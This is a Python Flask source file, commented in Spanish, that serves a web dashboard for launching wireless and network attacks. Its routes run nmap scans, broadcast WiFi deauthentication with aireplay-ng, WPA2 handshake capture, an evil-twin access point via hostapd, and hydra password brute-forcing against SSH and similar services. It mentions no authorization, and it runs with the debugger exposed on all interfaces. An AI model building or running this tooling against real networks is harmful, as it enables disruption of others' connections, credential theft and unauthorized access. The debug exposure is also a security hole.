from flask import Flask, render_template, jsonify, request, Response
import subprocess
import threading
import os
import json
import queue

# ── Inicialización ───────────────────────────────────────────
# Flask busca templates en ../templates y static en ../static
# relativo a donde está app.py
app = Flask(
    __name__,
    template_folder=os.path.join(os.path.dirname(__file__), '..', 'templates'),
    static_folder=os.path.join(os.path.dirname(__file__), '..', 'static')
)

# Cola global para transmitir output en tiempo real a la interfaz
# Es como un buffer: el ataque escribe acá, la interfaz lee de acá
output_queue = queue.Queue()

# ── Utilidad: ejecutar comando y emitir output línea por línea ──
def run_command(cmd, shell=False):
    try:
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            shell=shell,
            bufsize=1,          # buffer de línea en línea
            env={**os.environ, 'PYTHONUNBUFFERED': '1'}  # forzar flush
        )
        
        for line in iter(process.stdout.readline, ''):
            if line:
                output_queue.put(line.strip())
        
        process.wait()
        output_queue.put('__DONE__')
        
    except FileNotFoundError:
        output_queue.put(f'[ERROR] Herramienta no encontrada: {cmd[0]}')
        output_queue.put('__DONE__')
    except Exception as e:
        output_queue.put(f'[ERROR] {str(e)}')
        output_queue.put('__DONE__')

# ── SSE: Server-Sent Events ──────────────────────────────────
# Mecanismo para enviar datos del servidor a la interfaz en tiempo real
# La interfaz abre una conexión y el servidor le manda líneas a medida que aparecen
def event_stream():
    """
    Generador que lee de la cola y emite eventos SSE.
    El formato SSE es: 'data: <contenido>\n\n'
    """
    while True:
        try:
            # timeout=1 evita que se bloquee indefinidamente
            line = output_queue.get(timeout=1)
            if line == '__DONE__':
                yield f'data: __DONE__\n\n'
                break
            yield f'data: {line}\n\n'
        except queue.Empty:
            # Mandar un comentario SSE para mantener la conexión viva
            yield ': keepalive\n\n'

# ── Rutas de la aplicación ───────────────────────────────────

@app.route('/')
def index():
    """Sirve la página principal (templates/index.html)"""
    return render_template('index.html')

@app.route('/stream')
def stream():
    """
    Endpoint SSE — la interfaz se conecta acá para recibir
    el output de los ataques en tiempo real
    """
    return Response(
        event_stream(),
        mimetype='text/event-stream',
        headers={
            'Cache-Control': 'no-cache',
            'X-Accel-Buffering': 'no'  # evita que nginx bufferee la respuesta
        }
    )

# ── MÓDULO 1: Escaneo de red con Nmap ───────────────────────
@app.route('/api/scan/network', methods=['POST'])
def scan_network():
    """
    Escanea hosts activos en un rango de red.
    Recibe: { "target": "192.168.1.0/24" }
    """
    data = request.get_json()
    target = data.get('target', '192.168.1.0/24')
    
    # Limpiar la cola antes de empezar
    while not output_queue.empty():
        output_queue.get()
    
    # Correr nmap en un thread separado para no bloquear Flask
    # -sn: ping scan (solo detecta hosts, no escanea puertos)
    # -v: verbose (más información)
    thread = threading.Thread(
        target=run_command,
        args=(['nmap', '-sn', '-v', '--stats-every', '2s', target],)
    )
    thread.daemon = True  # el thread muere si el servidor se cierra
    thread.start()
    
    return jsonify({'status': 'started', 'target': target})

@app.route('/api/scan/ports', methods=['POST'])
def scan_ports():
    """
    Escanea puertos y detecta servicios en un host.
    Recibe: { "target": "192.168.1.1", "ports": "1-1000" }
    """
    data = request.get_json()
    target = data.get('target')
    ports = data.get('ports', '1-1000')
    
    if not target:
        return jsonify({'error': 'Se requiere un target'}), 400
    
    while not output_queue.empty():
        output_queue.get()
    
    # -sV: detecta versiones de servicios
    # -p: rango de puertos
    thread = threading.Thread(
        target=run_command,
        args=(['nmap', '-sV', '-p', ports, target],)
    )
    thread.daemon = True
    thread.start()
    
    return jsonify({'status': 'started', 'target': target, 'ports': ports})

# ── MÓDULO 2: WiFi ───────────────────────────────────────────
@app.route('/api/wifi/scan', methods=['POST'])
def wifi_scan():
    """
    Escanea redes WiFi cercanas.
    Recibe: { "interface": "wlan0" }
    """
    data = request.get_json()
    interface = data.get('interface', 'wlan0')
    
    while not output_queue.empty():
        output_queue.get()
    
    # Primero poner la interfaz en modo monitor
    # iwconfig: herramienta para configurar interfaces WiFi
    def scan_sequence():
        run_command(['airmon-ng', 'start', interface])
        # La interfaz en modo monitor suele llamarse wlan0mon
        run_command(['airodump-ng', '--output-format', 'csv', '-w', '/tmp/scan', f'{interface}mon'])
    
    thread = threading.Thread(target=scan_sequence)
    thread.daemon = True
    thread.start()
    
    return jsonify({'status': 'started', 'interface': interface})

@app.route('/api/wifi/deauth', methods=['POST'])
def wifi_deauth():
    """
    Envía paquetes de desautenticación a un cliente o a todos los clientes de una red.
    Recibe: { "bssid": "AA:BB:CC:DD:EE:FF", "client": "FF:EE:DD:CC:BB:AA", "interface": "wlan0mon", "count": 10 }
    Si client es "FF:FF:FF:FF:FF:FF" desautentica a todos los clientes (broadcast)
    """
    data = request.get_json()
    bssid = data.get('bssid')
    client = data.get('client', 'FF:FF:FF:FF:FF:FF')  # broadcast por defecto
    interface = data.get('interface', 'wlan0mon')
    count = str(data.get('count', 10))
    
    if not bssid:
        return jsonify({'error': 'Se requiere el BSSID de la red objetivo'}), 400
    
    while not output_queue.empty():
        output_queue.get()
    
    # aireplay-ng --deauth: envía paquetes de desautenticación
    # count: cuántos paquetes enviar (0 = infinito)
    # -a: BSSID del AP objetivo
    # -c: MAC del cliente objetivo (opcional)
    cmd = ['aireplay-ng', '--deauth', count, '-a', bssid, '-c', client, interface]
    
    thread = threading.Thread(target=run_command, args=(cmd,))
    thread.daemon = True
    thread.start()
    
    return jsonify({'status': 'started', 'bssid': bssid, 'client': client})

@app.route('/api/wifi/handshake', methods=['POST'])
def wifi_handshake():
    """
    Captura el handshake WPA2 de una red objetivo.
    Recibe: { "bssid": "AA:BB:CC:DD:EE:FF", "channel": "6", "interface": "wlan0mon" }
    """
    data = request.get_json()
    bssid = data.get('bssid')
    channel = data.get('channel', '1')
    interface = data.get('interface', 'wlan0mon')
    
    if not bssid:
        return jsonify({'error': 'Se requiere el BSSID'}), 400
    
    while not output_queue.empty():
        output_queue.get()
    
    # Captura el tráfico de la red objetivo y guarda en /tmp/handshake
    # --bssid: filtra por el AP objetivo
    # --channel: canal del AP
    # -w: archivo de salida
    cmd = ['airodump-ng', '--bssid', bssid, '--channel', channel, '-w', '/tmp/handshake', interface]
    
    thread = threading.Thread(target=run_command, args=(cmd,))
    thread.daemon = True
    thread.start()
    
    return jsonify({'status': 'started', 'bssid': bssid})

# ── MÓDULO 3: Evil Twin ──────────────────────────────────────
@app.route('/api/wifi/eviltwin', methods=['POST'])
def evil_twin():
    """
    Crea un AP falso con el mismo SSID que la red objetivo.
    Recibe: { "ssid": "NombreDeRed", "interface": "wlan0" }
    """
    data = request.get_json()
    ssid = data.get('ssid')
    interface = data.get('interface', 'wlan0')
    
    if not ssid:
        return jsonify({'error': 'Se requiere el SSID'}), 400
    
    while not output_queue.empty():
        output_queue.get()
    
    # Crear archivo de configuración para hostapd
    # hostapd es el demonio que crea el AP
    hostapd_conf = f"""
interface={interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
    # Escribir la config en /tmp
    with open('/tmp/hostapd.conf', 'w') as f:
        f.write(hostapd_conf)
    
    def start_eviltwin():
        run_command(['hostapd', '/tmp/hostapd.conf'])
    
    thread = threading.Thread(target=start_eviltwin)
    thread.daemon = True
    thread.start()
    
    return jsonify({'status': 'started', 'ssid': ssid})

# ── MÓDULO 4: Fuerza bruta ───────────────────────────────────
@app.route('/api/bruteforce', methods=['POST'])
def bruteforce():
    """
    Ataque de fuerza bruta sobre un servicio.
    Recibe: { "target": "192.168.1.1", "service": "ssh", "user": "admin", "wordlist": "/usr/share/wordlists/rockyou.txt" }
    """
    data = request.get_json()
    target = data.get('target')
    service = data.get('service', 'ssh')
    user = data.get('user', 'admin')
    wordlist = data.get('wordlist', '/usr/share/wordlists/rockyou.txt')
    
    if not target:
        return jsonify({'error': 'Se requiere un target'}), 400
    
    while not output_queue.empty():
        output_queue.get()
    
    # hydra: herramienta de fuerza bruta
    # -l: usuario
    # -P: wordlist de contraseñas
    # target: IP objetivo
    # service: protocolo (ssh, ftp, http-get, etc.)
    cmd = ['hydra', '-l', user, '-P', wordlist, target, service]
    
    thread = threading.Thread(target=run_command, args=(cmd,))
    thread.daemon = True
    thread.start()
    
    return jsonify({'status': 'started', 'target': target, 'service': service})

app.config['SEND_FILE_MAX_AGE_DEFAULT'] = 0

# ── Iniciar servidor ─────────────────────────────────────────
if __name__ == '__main__':
    # host='0.0.0.0' permite conexiones desde cualquier IP de la red local
    # Así el navegador del teléfono puede conectarse al servidor
    # debug=True recarga automáticamente cuando cambiás el código (solo en desarrollo)
    app.run(host='0.0.0.0', port=5001, debug=True, threaded=True)